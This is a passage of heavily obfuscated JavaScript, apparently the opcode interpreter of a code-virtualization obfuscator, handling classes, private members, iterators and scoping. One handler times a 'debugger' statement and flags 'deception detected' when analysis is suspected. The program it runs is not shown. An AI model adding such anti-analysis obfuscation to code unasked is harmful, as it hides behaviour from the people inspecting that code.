CW=ja[--jn],Cu=ja[jn-0x1],CO=jJ[Cw];vmZ(Cu['prototype'],CO,{'value':CW,'writable':!![],'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x91:{yj:{let Cz=ja[--jn],Co=ja[jn-0x1],Ct=jJ[Cw],Ck=D(Co);vmZ(Ck,Ct,{'get':Cz,'enumerable':Ck===Co,'configurable':!![]}),jw++;}break;}case 0x7b:{yC:{let CT=ja[--jn],CX=CT['next']();ja[jn++]=CX,jw++;}break;}case 0x83:{yl:{let CL=ja[--jn];CL&&typeof CL['return']==='function'?ja[jn++]=Promise['resolve'](CL['return']()):ja[jn++]=Promise['resolve'](),jw++;}break;}case 0x97:{yE:{let CR=ja[--jn],Cm=ja[--jn],CV=jJ[Cw],CH=A(),CP='set_'+CV,Ce=CH['get'](CP);if(Ce&&Ce['has'](Cm)){let l0=Ce['get'](Cm);l0['call'](Cm,CR),ja[jn++]=CR,jw++;break yE;}let Ch='_$XyWOr0'+'set_'+CV['substring'](0x1)+'_$5OGgh7';if(Cm['constructor']&&Ch in Cm['constructor']){let l1=Cm['constructor'][Ch];l1['call'](Cm,CR),ja[jn++]=CR,jw++;break yE;}let Cc=CH['get'](CV);if(Cc&&Cc['has'](Cm)){Cc['set'](Cm,CR),ja[jn++]=CR,jw++;break yE;}let Cp=q(CV);if(Cp in Cm){Cm[Cp]=CR,ja[jn++]=CR,jw++;break yE;}throw new TypeError('Cannot\x20write\x20private\x20member\x20'+CV+'\x20to\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}break;}case 0x68:{yN:{let l2=ja[--jn],l3=G(C3,l2),l4=ja[--jn];if(typeof l4!=='function')throw new TypeError(l4+'\x20is\x20not\x20a\x20constructor');if(b['has'](l4))throw new TypeError(l4['name']+'\x20is\x20not\x20a\x20constructor');let l5=vmg_8e0e94['_$mOUl7D'];vmg_8e0e94['_$mOUl7D']=undefined;let l6;try{l6=Reflect['construct'](l4,l3);}finally{vmg_8e0e94['_$mOUl7D']=l5;}ja[jn++]=l6,jw++;}break;}case 0x69:{yy:{let l7=ja[--jn],l8=G(C3,l7),l9=ja[--jn];if(Cw===0x1){ja[jn++]=l8,jw++;break yy;}if(vmg_8e0e94['_$JaeRAU']){jw++;break yy;}let lj=vmg_8e0e94['_$kbZqo7'];if(lj){let lC=lj['parent'],ll=lj['newTarget'],lE=Reflect['construct'](lC,l8,ll);jA&&jA!==lE&&vmv(jA)['forEach'](function(lN){!(lN in lE)&&(lE[lN]=jA[lN]);});jA=lE,CY['_$EnCqdU']=!![];CY['_$gGmnny']&&(K(CY['_$pS9Iwn'],'__this__'),!CY['_$pS9Iwn']['_$Ejew7m']&&(CY['_$pS9Iwn']['_$Ejew7m']=vmY(null)),CY['_$pS9Iwn']['_$Ejew7m']['__this__']=jA);jw++;break yy;}if(typeof l9!=='function')throw new TypeError('Super\x20expression\x20must\x20be\x20a\x20constructor');vmg_8e0e94['_$iBkIOU']=jr;try{let lN=l9['apply'](jA,l8);lN!==undefined&&lN!==jA&&typeof lN==='object'&&(jA&&Object['assign'](lN,jA),jA=lN),CY['_$EnCqdU']=!![],CY['_$gGmnny']&&(K(CY['_$pS9Iwn'],'__this__'),!CY['_$pS9Iwn']['_$Ejew7m']&&(CY['_$pS9Iwn']['_$Ejew7m']=vmY(null)),CY['_$pS9Iwn']['_$Ejew7m']['__this__']=jA);}catch(ly){if(ly instanceof TypeError&&(ly['message']['includes']('\x27new\x27')||ly['message']['includes']('constructor'))){let lx=Reflect['construct'](l9,l8,jr);lx!==jA&&jA&&Object['assign'](lx,jA),jA=lx,CY['_$EnCqdU']=!![],CY['_$gGmnny']&&(K(CY['_$pS9Iwn'],'__this__'),!CY['_$pS9Iwn']['_$Ejew7m']&&(CY['_$pS9Iwn']['_$Ejew7m']=vmY(null)),CY['_$pS9Iwn']['_$Ejew7m']['__this__']=jA);}else throw ly;}finally{delete vmg_8e0e94['_$iBkIOU'];}jw++;}break;}case 0x6a:{yx:{let li=ja[--jn];ja[jn++]=import(li),jw++;}break;}case 0x94:{yi:{let lg=ja[--jn],lf=ja[jn-0x1],lU=jJ[Cw];vmZ(lf,lU,{'get':lg,'enumerable':![],'configurable':!![]}),jw++;}break;}case 0xa5:{yg:{ja[jn++]=vmM[Cw],jw++;}break;}case 0x5d:{yf:{let ld=ja[--jn],lM={'value':Array['isArray'](ld)?ld:Array['from'](ld)};M['add'](lM),ja[jn++]=lM,jw++;}break;}case 0x9a:{yU:{let lb=ja[--jn],lZ=ja[--jn],lY=jJ[Cw],lG=null,lv=a();if(lv){let lB=lv['get'](lY);lB&&lB['has'](lZ)&&(lG=lB['get'](lZ));}if(lG===null){let lF=w(lY);lF in lZ&&(lG=lZ[lF]);}if(lG===null)throw new TypeError('Cannot\x20read\x20private\x20member\x20'+lY+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');if(typeof lG!=='function')throw new TypeError(lY+'\x20is\x20not\x20a\x20function');let lS=G(C3,lb),lD=lG['apply'](lZ,lS);ja[jn++]=lD,jw++;}break;}case 0x8e:{yd:{let lK=ja[--jn],lQ=ja[--jn],lr=vmg_8e0e94['_$mOUl7D'],lA=lr?vmB(lr):B(lQ),la=F(lA,lK);if(la['desc']&&la['desc']['get']){let lq=la['desc']['get']['call'](lQ);ja[jn++]=lq,jw++;break yd;}if(la['desc']&&la['desc']['set']&&!('value'in la['desc'])){ja[jn++]=undefined,jw++;break yd;}let ln=la['proto']?la['proto'][lK]:lA[lK];if(typeof ln==='function'){let lw=la['proto']||lA,lJ=ln['bind'](lQ),ls=ln['constructor']&&ln['constructor']['name'],lI=ls==='GeneratorFunction'||ls==='AsyncFunction'||ls==='AsyncGeneratorFunction';!lI&&(!vmg_8e0e94['_$j2q9Zj']&&(vmg_8e0e94['_$j2q9Zj']=new WeakMap()),vmg_8e0e94['_$j2q9Zj']['set'](lJ,lw)),ja[jn++]=lJ;}else ja[jn++]=ln;jw++;}break;}case 0xb9:{yM:{let lW=ja[--jn],lu=ja[--jn],lO=ja[jn-0x1];vmZ(lO,lu,{'set':lW,'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x5a:{yb:{ja[jn++]=[],jw++;}break;}case 0x8c:{yZ:{let lz=ja[--jn],lo=ja[--jn],lt=Cw,lk=function(lT,lX){let lL=function(){if(lT){lX&&(vmg_8e0e94['_$YQ0riY']=lL);let lR='_$iBkIOU'in vmg_8e0e94;!lR&&(vmg_8e0e94['_$iBkIOU']=new.target);try{let lm=lT['apply'](this,S(arguments));if(lX&&lm!==undefined&&(typeof lm!=='object'||lm===null))throw new TypeError('Derived\x20constructors\x20may\x20only\x20return\x20object\x20or\x20undefined');return lm;}finally{lX&&delete vmg_8e0e94['_$YQ0riY'],!lR&&delete vmg_8e0e94['_$iBkIOU'];}}};return lL;}(lo,lt);lz&&vmZ(lk,'name',{'value':lz,'configurable':!![]}),ja[jn++]=lk,jw++;}break;}case 0xa6:{yY:{ja[jn++]=vmb[Cw],jw++;}break;}case 0x9d:{yG:{let lT=ja[--jn],lX=jJ[Cw],lL=a();if(lL){let lV='get_'+lX,lH=lL['get'](lV);if(lH&&lH['has'](lT)){let le=lH['get'](lT);ja[jn++]=le['call'](lT),jw++;break yG;}let lP=lL['get'](lX);if(lP&&lP['has'](lT)){ja[jn++]=lP['get'](lT),jw++;break yG;}}let lR='_$XyWOr0'+'get_'+lX['substring'](0x1)+'_$5OGgh7';if(lR in lT){let lh=lT[lR];ja[jn++]=lh['call'](lT),jw++;break yG;}let lm=q(lX);if(lm in lT){ja[jn++]=lT[lm],jw++;break yG;}throw new TypeError('Cannot\x20read\x20private\x20member\x20'+lX+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}break;}case 0xb6:{yv:{let lc=ja[--jn],lp=ja[--jn],E0=ja[jn-0x1],E1=D(E0);vmZ(E1,lp,{'get':lc,'enumerable':E1===E0,'configurable':!![]}),jw++;}break;}case 0x5b:{yS:{let E2=ja[--jn],E3=ja[jn-0x1];E3['push'](E2),jw++;}break;}case 0xb5:{yD:{let E4=ja[--jn],E5=ja[--jn],E6=ja[jn-0x1];vmZ(E6,E5,{'value':E4,'writable':!![],'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x98:{yB:{let E7=ja[--jn],E8=ja[--jn],E9=jJ[Cw],Ej=A();!Ej['has'](E9)&&Ej['set'](E9,new WeakMap());let EC=Ej['get'](E9);if(EC['has'](E8))throw new TypeError('Cannot\x20initialize\x20'+E9+'\x20twice\x20on\x20the\x20same\x20object');EC['set'](E8,E7),jw++;}break;}case 0xb4:{yF:{let El=ja[--jn],EE=ja[--jn],EN=ja[jn-0x1];vmZ(EN['prototype'],EE,{'value':El,'writable':!![],'enumerable':![],'configurable':!![]}),jw++;}break;}case 0xa3:{yK:{ja[--jn],ja[jn++]=undefined,jw++;}break;}case 0x6f:{yQ:{let Ey=ja[--jn],Ex=ja[--jn];ja[jn++]=Ex instanceof Ey,jw++;}break;}case 0xa9:{yr:{let Ei=ja[--jn];ja[jn++]=Symbol['keyFor'](Ei),jw++;}break;}case 0x92:{yA:{let Eg=ja[--jn],Ef=ja[jn-0x1],EU=jJ[Cw],Ed=D(Ef);vmZ(Ed,EU,{'set':Eg,'enumerable':Ed===Ef,'configurable':!![]}),jw++;}break;}case 0xb8:{ya:{let EM=ja[--jn],Eb=ja[--jn],EZ=ja[jn-0x1];vmZ(EZ,Eb,{'get':EM,'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x93:{yn:{let EY=ja[--jn],EG=ja[jn-0x1],Ev=jJ[Cw];vmZ(EG,Ev,{'value':EY,'writable':!![],'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x64:{yq:{let ES=ja[--jn],ED=typeof ES==='object'?ES:jv(ES),EB=ED&&ED[0xc],EF=ED&&ED[0x8],EK=ED&&ED[0xd],EQ=ED&&ED[0x0],Er=ED&&ED[0x12]||0x0,EA=ED&&ED[0x6],Ea=EB?CY['_$7e7bv7']:undefined,En=CY['_$pS9Iwn'],Eq;if(EK)Eq=I(jD,ES,En,b,EA,vmd);else{if(EF){if(EB)Eq=u(jS,ES,En,Ea);else EQ?Eq=z(jS,ES,En,EA,vmd):Eq=s(jS,ES,En,EA,vmd);}else{if(EB)Eq=W(T,ES,En,Ea);else EQ?Eq=O(T,ES,En,EA,vmd):Eq=J(T,ES,En,EA,vmd);}}Y(Eq,'length',{'value':Er,'writable':![],'enumerable':![],'configurable':!![]}),ja[jn++]=Eq,jw++;}break;}case 0xa7:{yw:{if(Cw===-0x1)ja[jn++]=Symbol();else{let Ew=ja[--jn];ja[jn++]=Symbol(Ew);}jw++;}break;}case 0xb7:{yJ:{let EJ=ja[--jn],Es=ja[--jn],EI=ja[jn-0x1],EW=D(EI);vmZ(EW,Es,{'set':EJ,'enumerable':EW===EI,'configurable':!![]}),jw++;}break;}case 0x5e:{ys:{let Eu=ja[--jn],EO=ja[jn-0x1];if(Array['isArray'](Eu))Array['prototype']['push']['apply'](EO,Eu);else for(let Ez of Eu){EO['push'](Ez);}jw++;}break;}case 0x81:{yI:{let Eo=ja[--jn];if(Eo==null)throw new TypeError('Cannot\x20iterate\x20over\x20'+Eo);let Et=Eo[Symbol['asyncIterator']];if(typeof Et==='function')ja[jn++]=Et['call'](Eo);else{let Ek=Eo[Symbol['iterator']];if(typeof Ek!=='function')throw new TypeError('Object\x20is\x20not\x20async\x20iterable');ja[jn++]=Ek['call'](Eo);}jw++;}break;}case 0x8f:{yW:{let ET=ja[--jn],EX=ja[--jn],EL=ja[--jn],ER=B(EL),Em=F(ER,EX);Em['desc']&&Em['desc']['set']?Em['desc']['set']['call'](EL,ET):EL[EX]=ET,ja[jn++]=ET,jw++;}break;}case 0x8d:{yu:{let EV=ja[--jn],EH=ja[jn-0x1];if(EV===null){vmD(EH['prototype'],null),vmD(EH,Function['prototype']),EH['_$LOrFnP']=null,jw++;break yu;}if(typeof EV!=='function')throw new TypeError('Class\x20extends\x20value\x20'+String(EV)+'\x20is\x20not\x20a\x20constructor\x20or\x20null');let EP=![];try{let Ee=vmY(EV['prototype']),Eh=EV['apply'](Ee,[]);Eh!==undefined&&Eh!==Ee&&(EP=!![]);}catch(Ec){Ec instanceof TypeError&&(Ec['message']['includes']('\x27new\x27')||Ec['message']['includes']('constructor')||Ec['message']['includes']('Illegal\x20constructor'))&&(EP=!![]);}if(EP){let Ep=EH,N0=vmg_8e0e94,N1='_$iBkIOU',N2='_$YQ0riY',N3='_$kbZqo7';function CJ(...N4){let N5=vmY(EV['prototype']);N0[N3]={'parent':EV,'newTarget':new.target||CJ},N0[N2]=new.target||CJ;let N6=N1 in N0;!N6&&(N0[N1]=new.target);try{let N7=Ep['apply'](N5,N4);N7!==undefined&&typeof N7==='object'&&(N5=N7);}finally{delete N0[N3],delete N0[N2],!N6&&delete N0[N1];}return N5;}CJ['prototype']=vmY(EV['prototype']),CJ['prototype']['constructor']=CJ,vmD(CJ,EV),vmv(Ep)['forEach'](function(N4){N4!=='prototype'&&N4!=='length'&&N4!=='name'&&Y(CJ,N4,vmG(Ep,N4));});Ep['prototype']&&(vmv(Ep['prototype'])['forEach'](function(N4){N4!=='constructor'&&Y(CJ['prototype'],N4,vmG(Ep['prototype'],N4));}),vmS(Ep['prototype'])['forEach'](function(N4){Y(CJ['prototype'],N4,vmG(Ep['prototype'],N4));}));ja[--jn],ja[jn++]=CJ,CJ['_$LOrFnP']=EV,jw++;break yu;}vmD(EH['prototype'],EV['prototype']),vmD(EH,EV),EH['_$LOrFnP']=EV,jw++;}break;}case 0xa2:{yO:{let N4=Cw&0xffff,N5=Cw>>0x10,N6=jJ[N4],N7=jJ[N5];ja[jn++]=new RegExp(N6,N7),jw++;}break;}case 0xa8:{yz:{let N8=jJ[Cw];ja[jn++]=Symbol['for'](N8),jw++;}break;}case 0x99:{yo:{let N9=ja[--jn],Nj=jJ[Cw],NC=![],Nl=a();if(Nl){let NE=Nl['get'](Nj);NE&&NE['has'](N9)&&(NC=!![]);}ja[jn++]=NC,jw++;}break;}case 0x9b:{yt:{let NN=ja[--jn],Ny=jJ[Cw];if(NN==null){ja[jn++]=undefined,jw++;break yt;}let Nx=A(),Ni=Nx['get'](Ny);if(!Ni||!Ni['has'](NN))throw new TypeError('Cannot\x20read\x20private\x20member\x20'+Ny+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');ja[jn++]=Ni['get'](NN),jw++;}break;}case 0x7c:{yk:{let Ng=ja[--jn];Ng&&typeof Ng['return']==='function'&&Ng['return'](),jw++;}break;}case 0xa1:{yT:{if(CC===null){if(CY['_$PrfoPg']||!CY['_$ljpiDP']){let Nf=CY['_$GeMxwg']||jF,NU=Nf?Nf['length']:0x0;CC=vmY(Object['prototype']);for(let Nd=0x0;Nd<NU;Nd++){CC[Nd]=Nf[Nd];}vmZ(CC,'length',{'value':NU,'writable':!![],'enumerable':![],'configurable':!![]}),vmZ(CC,Symbol['iterator'],{'value':Array['prototype'][Symbol['iterator']],'writable':!![],'enumerable':![],'configurable':!![]}),CC=new Proxy(CC,{'has':function(NM,Nb){if(Nb===Symbol['toStringTag'])return![];return Nb in NM;},'get':function(NM,Nb,NZ){if(Nb===Symbol['toStringTag'])return'Arguments';return Reflect['get'](NM,Nb,NZ);}}),CY['_$PrfoPg']?vmZ(CC,'callee',{'get':d,'set':d,'enumerable':![],'configurable':![]}):vmZ(CC,'callee',{'value':jQ,'writable':!![],'enumerable':![],'configurable':!![]});}else{let NM=jF?jF['length']:0x0,Nb={},NZ={},NY=jQ,NG=![],Nv=!![],NS={},ND=function(Nr){if(typeof Nr!=='string')return NaN;let NA=+Nr;return NA>=0x0&&NA%0x1===0x0&&String(NA)===Nr?NA:NaN;},NB=function(Nr){return!isNaN(Nr)&&Nr>=0x0;},NF=function(Nr){if(Nr in NZ)return undefined;if(Nr in Nb)return Nb[Nr];return Nr<jF['length']?jF[Nr]:undefined;},NK=function(Nr){if(Nr in NZ)return![];if(Nr in Nb)return!![];return Nr<jF['length']?Nr in jF:![];},NQ={};vmZ(NQ,'length',{'value':NM,'writable':!![],'enumerable':![],'configurable':!![]}),vmZ(NQ,'callee',{'value':jQ,'writable':!![],'enumerable':![],'configurable':!![]}),vmZ(NQ,Symbol['iterator'],{'value':Array['prototype'][Symbol['iterator']],'writable':!![],'enumerable':![],'configurable':!![]}),CC=new Proxy(NQ,{'get':function(Nr,NA,Na){if(NA==='length')return NM;if(NA==='callee')return NG?undefined:NY;if(NA===Symbol['toStringTag'])return'Arguments';let Nn=ND(NA);if(NB(Nn)){if(Nn in NS)return Reflect['get'](Nr,NA,Na);return NF(Nn);}return Reflect['get'](Nr,NA,Na);},'set':function(Nr,NA,Na){if(NA==='length'){if(!Nv)return![];return NM=Na,Nr['length']=Na,!![];}if(NA==='callee')return NY=Na,NG=![],Nr['callee']=Na,!![];let Nn=ND(NA);if(NB(Nn)){if(Nn in NS)return Reflect['set'](Nr,NA,Na);let Nq=vmG(Nr,String(Nn));if(Nq&&!Nq['writable'])return![];if(Nn in NZ)delete NZ[Nn],Nb[Nn]=Na;else Nn<jF['length']?jF[Nn]=Na:Nb[Nn]=Na;return!![];}return Nr[NA]=Na,!![];},'has':function(Nr,NA){if(NA==='length')return!![];if(NA==='callee')return!NG;if(NA===Symbol['toStringTag'])return![];let Na=ND(NA);if(NB(Na)){if(String(Na)in Nr)return!![];return NK(Na);}return NA in Nr;},'defineProperty':function(Nr,NA,Na){if(NA==='length')return'value'in Na&&(NM=Na['value']),'writable'in Na&&(Nv=Na['writable']),vmZ(Nr,NA,Na),!![];if(NA==='callee')return'value'in Na&&(NY=Na['value']),NG=![],vmZ(Nr,NA,Na),!![];let Nn=ND(NA);if(NB(Nn)){if('get'in Na||'set'in Na)NS[Nn]=0x1,Nn in Nb&&delete Nb[Nn],Nn in NZ&&delete NZ[Nn];else'value'in Na&&(Nn<jF['length']&&!(Nn in NZ)?jF[Nn]=Na['value']:(Nb[Nn]=Na['value'],Nn in NZ&&delete NZ[Nn]));return vmZ(Nr,String(Nn),Na),!![];}return vmZ(Nr,NA,Na),!![];},'deleteProperty':function(Nr,NA){if(NA==='callee')return NG=!![],delete Nr['callee'],!![];let Na=ND(NA);return NB(Na)&&(Na in NS&&delete NS[Na],Na<jF['length']?NZ[Na]=0x1:delete Nb[Na]),delete Nr[NA],!![];},'preventExtensions':function(Nr){let NA=jF?jF['length']:0x0;for(let Na=0x0;Na<NA;Na++){!(Na in NZ)&&!vmG(Nr,String(Na))&&vmZ(Nr,String(Na),{'value':NF(Na),'writable':!![],'enumerable':!![],'configurable':!![]});}for(let Nn in Nb){!vmG(Nr,Nn)&&vmZ(Nr,Nn,{'value':Nb[Nn],'writable':!![],'enumerable':!![],'configurable':!![]});}return Object['preventExtensions'](Nr),!![];},'getOwnPropertyDescriptor':function(Nr,NA){if(NA==='callee'){if(NG)return undefined;return vmG(Nr,'callee');}if(NA==='length')return vmG(Nr,'length');let Na=ND(NA);if(NB(Na)){if(Na in NS)return vmG(Nr,NA);if(NK(Na)){let Nq=vmG(Nr,String(Na));return{'value':NF(Na),'writable':Nq?Nq['writable']:!![],'enumerable':Nq?Nq['enumerable']:!![],'configurable':Nq?Nq['configurable']:!![]};}return vmG(Nr,NA);}let Nn=vmG(Nr,NA);if(Nn)return Nn;return undefined;},'ownKeys':function(Nr){let NA=[],Na=jF?jF['length']:0x0;for(let Nq=0x0;Nq<Na;Nq++){!(Nq in NZ)&&NA['push'](String(Nq));}for(let Nw in Nb){NA['indexOf'](Nw)===-0x1&&NA['push'](Nw);}NA['push']('length');!NG&&NA['push']('callee');let Nn=Reflect['ownKeys'](Nr);for(let NJ=0x0;NJ<Nn['length'];NJ++){NA['indexOf'](Nn[NJ])===-0x1&&NA['push'](Nn[NJ]);}return NA;}});}}ja[jn++]=CC,jw++;}break;}case 0xa0:{yX:{if(CY['_$RGOBBT']&&!CY['_$EnCqdU'])throw new ReferenceError('Must\x20call\x20super\x20constructor\x20in\x20derived\x20class\x20before\x20accessing\x20\x27this\x27\x20or\x20returning\x20from\x20derived\x20constructor');ja[jn++]=jA,jw++;}break;}case 0x6e:{yL:{ja[jn-0x1]=typeof ja[jn-0x1],jw++;}break;}case 0x80:{yR:{let Nr=ja[--jn];ja[jn++]=!!Nr['done'],jw++;}break;}case 0x9c:{ym:{let NA=ja[--jn];ja[--jn];let Na=ja[jn-0x1],Nn=jJ[Cw],Nq=A();!Nq['has'](Nn)&&Nq['set'](Nn,new WeakMap());let Nw=Nq['get'](Nn);Nw['set'](Na,NA),jw++;}break;}case 0x95:{yV:{let NJ=ja[--jn],Ns=ja[jn-0x1],NI=jJ[Cw];vmZ(Ns,NI,{'set':NJ,'enumerable':![],'configurable':!![]}),jw++;}break;}case 0x5f:{yH:{let NW=ja[jn-0x1];NW['length']++,jw++;}break;}case 0x70:{yP:{let Nu=jJ[Cw];Nu in vmg_8e0e94?ja[jn++]=typeof vmg_8e0e94[Nu]:ja[jn++]=typeof vmd[Nu],jw++;}break;}case 0x7f:{ye:{let NO=ja[--jn];if(NO==null)throw new TypeError('Cannot\x20iterate\x20over\x20'+NO);let Nz=NO[Symbol['iterator']];if(typeof Nz!=='function')throw new TypeError('Object\x20is\x20not\x20iterable');ja[jn++]=vmQ(Nz,NO,[]),jw++;}break;}case 0x9e:{yh:{let No=ja[--jn],Nt=ja[--jn],Nk=jJ[Cw],NT=a();if(NT){let NR='set_'+Nk,Nm=NT['get'](NR);if(Nm&&Nm['has'](Nt)){let NH=Nm['get'](Nt);NH['call'](Nt,No),ja[jn++]=No,jw++;break yh;}let NV=NT['get'](Nk);if(NV&&NV['has'](Nt)){NV['set'](Nt,No),ja[jn++]=No,jw++;break yh;}}let NX='_$XyWOr0'+'set_'+Nk['substring'](0x1)+'_$5OGgh7';if(NX in Nt){let NP=Nt[NX];NP['call'](Nt,No),ja[jn++]=No,jw++;break yh;}let NL=q(Nk);if(NL in Nt){Nt[NL]=No,ja[jn++]=No,jw++;break yh;}throw new TypeError('Cannot\x20write\x20private\x20member\x20'+Nk+'\x20to\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}break;}case 0x96:{yc:{let Ne=ja[--jn],Nh=jJ[Cw],Nc=A(),Np='get_'+Nh,y0=Nc['get'](Np);if(y0&&y0['has'](Ne)){let y4=y0['get'](Ne);ja[jn++]=y4['call'](Ne),jw++;break yc;}let y1='_$XyWOr0'+'get_'+Nh['substring'](0x1)+'_$5OGgh7';if(Ne['constructor']&&y1 in Ne['constructor']){let y5=Ne['constructor'][y1];ja[jn++]=y5['call'](Ne),jw++;break yc;}let y2=Nc['get'](Nh);if(y2&&y2['has'](Ne)){ja[jn++]=y2['get'](Ne),jw++;break yc;}let y3=q(Nh);if(y3 in Ne){ja[jn++]=Ne[y3],jw++;break yc;}throw new TypeError('Cannot\x20read\x20private\x20member\x20'+Nh+'\x20from\x20an\x20object\x20whose\x20class\x20did\x20not\x20declare\x20it');}break;}case 0x84:{yp:{let y6=ja[--jn];ja[jn++]=v(y6),jw++;}break;}}},CD=function(Cq,Cw){switch(Cq){case 0xfe:{ls:{let Cs=Cw&0xffff,CI=Cw>>>0x10;ja[jn++]=jq[Cs]*jJ[CI],jw++;}break;}case 0x100:{lI:{let CW=Cw&0xffff,Cu=Cw>>>0x10;ja[jn++]=jq[CW]<jJ[Cu],jw++;}break;}case 0xd8:{lW:{let CO=jJ[Cw],Cz=ja[--jn],Co=CY['_$pS9Iwn'],Ct=![];while(Co){if(Co['_$Ejew7m']&&CO in Co['_$Ejew7m']){if(Co['_$f84dGi']&&CO in Co['_$f84dGi'])break;Co['_$Ejew7m'][CO]=Cz;!Co['_$f84dGi']&&(Co['_$f84dGi']=vmY(null));Co['_$f84dGi'][CO]=!![],Ct=!![];break;}Co=Co['_$xQCdVF'];}!Ct&&(Q(CY['_$pS9Iwn'],CO),!CY['_$pS9Iwn']['_$Ejew7m']&&(CY['_$pS9Iwn']['_$Ejew7m']=vmY(null)),CY['_$pS9Iwn']['_$Ejew7m'][CO]=Cz,!CY['_$pS9Iwn']['_$f84dGi']&&(CY['_$pS9Iwn']['_$f84dGi']=vmY(null)),CY['_$pS9Iwn']['_$f84dGi'][CO]=!![]),jw++;}break;}case 0xca:{lu:{return CZ=jn>0x0?ja[--jn]:undefined,0x1;}break;}case 0x103:{lO:{jq[Cw]=ja[--jn],jw++;}break;}case 0xdc:{lz:{let Ck=ja[--jn],CT=jJ[Cw];if(CY['_$PrfoPg']&&!(CT in vmd)&&!(CT in vmg_8e0e94))throw new ReferenceError(CT+'\x20is\x20not\x20defined');vmg_8e0e94[CT]=Ck,vmd[CT]=Ck,ja[jn++]=Ck,jw++;}break;}case 0xdb:{lo:{let CX=jJ[Cw],CL=ja[--jn],CR=CY['_$pS9Iwn']['_$xQCdVF'];CR&&(!CR['_$Ejew7m']&&(CR['_$Ejew7m']=vmY(null)),CR['_$Ejew7m'][CX]=CL),jw++;}break;}case 0x105:{lt:{let Cm=jq[Cw]-0x1;jq[Cw]=Cm,ja[jn++]=Cm,jw++;}break;}case 0xff:{lk:{let CV=Cw&0xffff,CH=Cw>>>0x10,CP=jq[CV],Ce=jJ[CH];ja[jn++]=CP[Ce],jw++;}break;}case 0xda:{lT:{let Ch=jJ[Cw];!CY['_$pS9Iwn']['_$n9ZZux']&&(CY['_$pS9Iwn']['_$n9ZZux']=vmY(null)),CY['_$pS9Iwn']['_$n9ZZux'][Ch]=!![],jw++;}break;}case 0xd7:{lX:{let Cc=jJ[Cw],Cp=ja[--jn];K(CY['_$pS9Iwn'],Cc),!CY['_$pS9Iwn']['_$Ejew7m']&&(CY['_$pS9Iwn']['_$Ejew7m']=vmY(null)),CY['_$pS9Iwn']['_$Ejew7m'][Cc]=Cp,jw++;}break;}case 0xd3:{lL:{let l0=jJ[Cw];if(l0==='__this__'){let l6=CY['_$pS9Iwn'];while(l6){if(l6['_$n9ZZux']&&'__this__'in l6['_$n9ZZux'])throw new ReferenceError('Cannot\x20access\x20\x27__this__\x27\x20before\x20initialization');if(l6['_$Ejew7m']&&'__this__'in l6['_$Ejew7m'])break;l6=l6['_$xQCdVF'];}ja[jn++]=jA,jw++;break lL;}let l1=CY['_$pS9Iwn'],l2,l3=![],l4=l0['indexOf']('$$'),l5=l4!==-0x1?l0['substring'](0x0,l4):null;while(l1){let l7=l1['_$n9ZZux'],l8=l1['_$Ejew7m'];if(l7&&l0 in l7)throw new ReferenceError('Cannot\x20access\x20\x27'+l0+'\x27\x20before\x20initialization');if(l5&&l7&&l5 in l7){if(!(l8&&l0 in l8))throw new ReferenceError('Cannot\x20access\x20\x27'+l5+'\x27\x20before\x20initialization');}if(l8&&l0 in l8){l2=l8[l0],l3=!![];break;}l1=l1['_$xQCdVF'];}!l3&&(l0 in vmg_8e0e94?l2=vmg_8e0e94[l0]:l2=vmd[l0]),ja[jn++]=l2,jw++;}break;}case 0x101:{lR:{let l9=Cw&0xffff,lj=Cw>>>0x10;jq[l9]<jJ[lj]?jw=jI[jw]:jw++;}break;}case 0xfc:{lm:{let lC=Cw&0xffff,ll=Cw>>>0x10;ja[jn++]=jq[lC]+jJ[ll],jw++;}break;}case 0xdd:{lV:{let lE=Cw&0xffff,lN=Cw>>>0x10,ly=jJ[lE],lx=CY['_$pS9Iwn'];for(let lf=0x0;lf<lN;lf++){lx=lx['_$xQCdVF'];}let li=lx['_$n9ZZux'];if(li&&ly in li)throw new ReferenceError('Cannot\x20access\x20\x27'+ly+'\x27\x20before\x20initialization');let lg=lx['_$Ejew7m'];ja[jn++]=lg?lg[ly]:undefined,jw++;}break;}case 0xfd:{lH:{let lU=Cw&0xffff,ld=Cw>>>0x10;ja[jn++]=jq[lU]-jJ[ld],jw++;}break;}case 0x10e:{lP:{debugger;jw++;}break;}case 0xfa:{le:{jq[Cw]=jq[Cw]+0x1,jw++;}break;}case 0xc9:{lh:{jw++;}break;}case 0xd9:{lc:{let lM=jJ[Cw],lb=ja[--jn];K(CY['_$pS9Iwn'],lM);if(!CY['_$pS9Iwn']['_$Ejew7m'])CY['_$pS9Iwn']['_$Ejew7m']=vmY(null);CY['_$pS9Iwn']['_$Ejew7m'][lM]=lb,!CY['_$pS9Iwn']['_$f84dGi']&&(CY['_$pS9Iwn']['_$f84dGi']=vmY(null)),CY['_$pS9Iwn']['_$f84dGi'][lM]=!![],jw++;}break;}case 0x10f:{lp:{if(typeof process!=='undefined'&&process['hrtime']&&process['hrtime']['bigint']){var CJ=process['hrtime']['bigint']();debugger;if(Number(process['hrtime']['bigint']()-CJ)/0xf4240>0.1)try{_setDeceptionDetected();}catch(lZ){}}jw++;}break;}case 0x104:{E0:{let lY=jq[Cw]+0x1;jq[Cw]=lY,ja[jn++]=lY,jw++;}break;}case 0xd4:{E1:{let lG=jJ[Cw],lv=ja[--jn],lS=CY['_$pS9Iwn'],lD=![];while(lS){let lB=lS['_$n9ZZux'],lF=lS['_$Ejew7m'];if(lB&&lG in lB)throw new ReferenceError('Cannot\x20access\x20\x27'+lG+'\x27\x20before\x20initialization');if(lF&&lG in lF){if(lS['_$j23EpX']&&lG in lS['_$j23EpX']){if(CY['_$PrfoPg'])throw new TypeError('Assignment\x20to\x20constant\x20variable.');lD=!![];break;}if(lS['_$f84dGi']&&lG in lS['_$f84dGi'])throw new TypeError('Assignment\x20to\x20constant\x20variable.');lF[lG]=lv,lD=!![];break;}lS=lS['_$xQCdVF'];}if(!lD){if(lG in vmg_8e0e94)vmg_8e0e94[lG]=lv;else lG in vmd?vmd[lG]=lv:vmd[lG]=lv;}jw++;}break;}case 